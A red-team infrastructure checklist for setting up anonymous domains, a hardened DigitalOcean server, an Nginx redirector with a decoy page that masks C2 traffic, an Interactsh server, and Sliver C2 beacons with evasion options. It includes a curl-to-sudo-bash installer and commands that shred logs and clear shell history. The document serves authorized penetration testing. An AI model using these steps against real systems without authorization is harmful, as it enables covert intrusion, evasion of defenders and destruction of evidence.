# Red Team Infrastructure Checklist

---

## 1. Pre-flight: OPSEC & Privacy

- [ ] Set up a dedicated privacy-focused email address
  - Use ProtonMail or similar — not tied to your real identity. Used for all accounts below.
- [ ] Prepare a privacy-focused payment method
  - Prepaid card or privacy.com virtual card for ALL purchases — DigitalOcean, registrar, and any other services.
- [ ] Generate ED25519 SSH keypair locally before anything else
  - `ssh-keygen -t ed25519 -f ~/.ssh/bb_do_key` — you need the public key ready for Droplet creation.
- [ ] Add key to SSH agent
  - `ssh-add ~/.ssh/bb_do_key`

---

## 2. Domain Registration

- [ ] Register domain via Njalla (best) or Namecheap + WhoisGuard
  - Njalla legally owns the domain on your behalf — no WHOIS exposure at all. Pay with Monero or BTC for full separation.
- [ ] Choose a neutral-sounding domain name
  - e.g. `cdn-assets-[random].com` or `static-[random]-files.net` — avoid pentest, red, hack.
- [ ] Register domain well in advance of any engagement
  - Aged domains raise less suspicion with blue teams.
- [ ] Set A record `@` → Droplet IP
  - Set this after provisioning the Droplet below.
- [ ] Set wildcard A record `*` → Droplet IP
  - Required for Interactsh unique subdomains per callback.

---

## 3. DigitalOcean Account & Droplet Provisioning

- [ ] Create DigitalOcean account using your privacy email
- [ ] Add your privacy payment method to the account
- [ ] Choose Droplet OS — Ubuntu 22.04 LTS x64
  - Long-term support, widest tooling compatibility.
- [ ] Choose Droplet spec — Basic shared CPU, 1GB RAM / 1 vCPU / 25GB SSD
  - $6/mo is sufficient. Scale up only if running heavy tooling.
- [ ] Select a neutral datacenter region
  - Frankfurt, Amsterdam, or Toronto — away from your home region.
- [ ] Paste your SSH public key during Droplet creation
  - `cat ~/.ssh/bb_do_key.pub` — this is why key gen comes first. Prevents DO from setting a root password (console-level protection).
- [ ] Disable password authentication in the DO console at creation time
  - This prevents DigitalOcean from setting a root password entirely — separate from sshd_config hardening done later.
- [ ] Note your Droplet IP — needed for DNS records and firewall rules
- [ ] Rename Droplet hostname to something generic
  - `hostnamectl set-hostname generic-server`

---

## 4. Droplet Hardening, SSH & Firewall

- [ ] SSH in as root, create non-root user (bbops)
  - `adduser bbops && usermod -aG sudo bbops`
- [ ] Copy authorized_keys to bbops user
  - `mkdir -p /home/bbops/.ssh && cp /root/.ssh/authorized_keys /home/bbops/.ssh/`
- [ ] Disable root SSH login
  - `PermitRootLogin no` — in `/etc/ssh/sshd_config.d/hardening.conf`
- [ ] Disable SSH password authentication at daemon level
  - `PasswordAuthentication no` — hardens sshd itself, separate from the DO console setting which only controls initial provisioning.
- [ ] Set `MaxAuthTries 3` and `LoginGraceTime 30`
- [ ] Restart sshd and verify key-only login works as bbops before closing root session
- [ ] Install and enable fail2ban
- [ ] Configure `~/.ssh/config` on local machine
  - `IdentityFile ~/.ssh/bb_do_key`, `IdentitiesOnly yes`, `ServerAliveInterval 60`
- [ ] Configure UFW — set all firewall rules in one pass
  - `ufw default deny incoming` / `ufw default allow outgoing`
- [ ] UFW: allow port 22 from your home IP only
  - `ufw allow from YOUR_HOME_IP to any port 22`
- [ ] UFW: allow 80/tcp (HTTP / Certbot challenge)
- [ ] UFW: allow 443/tcp (HTTPS)
- [ ] UFW: allow 53 TCP+UDP (Interactsh DNS callbacks)
- [ ] UFW: allow port 31337 from your home IP only
  - Sliver multiplayer operator port — restrict same as SSH.
- [ ] Enable UFW — `ufw enable`

---

## 5. TLS & Nginx Redirector

- [ ] Install Certbot and python3-certbot-nginx
- [ ] Issue wildcard cert via DNS challenge
  - `certbot certonly --manual --preferred-challenges dns -d yourdomain.com -d *.yourdomain.com`
- [ ] Add `_acme-challenge` TXT record to DNS, wait ~60s, then confirm
- [ ] Verify cert issued at `/etc/letsencrypt/live/yourdomain.com/`
- [ ] Add Certbot deploy hook to reload Nginx and restart Interactsh on renewal
- [ ] Configure Nginx — HTTP → HTTPS redirect on port 80
- [ ] Configure Nginx — TLS on port 443, TLSv1.2/1.3 only, strong cipher suite
- [ ] Add decoy catch-all `location /` → plain 200 OK response
  - Non-matching traffic gets a bland response — hides C2 from scanners and blue team recon.
- [ ] Add `/updates/` proxy block → Sliver HTTPS listener on `127.0.0.1:8888`
- [ ] Add `/oob/` proxy block → Interactsh on `127.0.0.1:8080`
- [ ] Add security headers — HSTS, X-Content-Type-Options, X-Frame-Options
  - Makes traffic profile look like a legitimate service.
- [ ] Test config — `nginx -t && systemctl reload nginx`

---

## 6. Interactsh OOB Server

- [ ] Install Go on the Droplet
- [ ] Install interactsh-server
  - `go install github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest`
- [ ] Move binary to `/usr/local/bin/`
- [ ] Create systemd unit for interactsh
  - Flags: `-domain`, `-ip`, `-http-port 8080`, `-dns-port 53`, `-token`
- [ ] Set a strong random value for `-token`
- [ ] Enable and start interactsh — `systemctl enable --now interactsh`
- [ ] Install interactsh-client on your local machine
- [ ] Test client connection to your server
  - `interactsh-client -server https://yourdomain.com -token YOUR_TOKEN -v`
- [ ] Confirm HTTP and DNS OOB callbacks are received in client output

---

## 7. Sliver C2 — Authorized Engagements Only

> **Warning:** Confirm signed SOW and rules of engagement before proceeding.
> Sliver on an unauthorized target is a serious crime regardless of what you find.

- [ ] Confirm signed SOW and rules of engagement before proceeding
- [ ] Install Sliver server on Droplet
  - `curl https://sliver.sh/install | sudo bash`
- [ ] Create systemd unit for sliver-server daemon and enable it
- [ ] Generate operator profile on server
  - `sliver-server operator --name yourname --lhost YOUR_DROPLET_IP --lport 31337 --save ~/yourname.cfg`
- [ ] Copy `.cfg` to `~/.sliver/configs/` on your local machine
  - `scp -i ~/.ssh/bb_do_key bbops@YOUR_DROPLET_IP:~/yourname.cfg ~/.sliver/configs/`
- [ ] Connect to Sliver server from local client
  - `sliver --config ~/.sliver/configs/yourname.cfg`
- [ ] Start HTTPS listener bound to localhost only
  - `https --lhost 127.0.0.1 --lport 8888` — never bind directly to a public interface.
- [ ] Create implant profile with URI matching the Nginx `/updates/` block
  - `--http https://yourdomain.com/updates/ --seconds 60 --jitter 15 --name rt-profile-01`
- [ ] Generate beacon with `--evasion` flag
  - `profiles generate --profile rt-profile-01 --os windows --arch amd64`
- [ ] Set User-Agent in implant to match target org's common browser UA
- [ ] Test full beacon check-in end-to-end through the redirector

---

## 8. OPSEC Hygiene — Per Engagement

- [ ] Use beacon intervals ≥45s with jitter
  - Fast beacons are a reliable EDR trigger.
- [ ] Never expose Sliver operator port 31337 beyond your home IP
- [ ] Use a separate implant profile per target and engagement
- [ ] Customise all URI paths away from Sliver defaults
- [ ] Rotate and purge logs after each engagement
  - `shred -u /var/log/nginx/*.log /var/log/auth.log`
- [ ] Clear shell history before teardown
  - `history -c && cat /dev/null > ~/.bash_history`
- [ ] Destroy and reprovision the Droplet between engagements
  - Ephemeral infra is the strongest OPSEC — don't reuse.
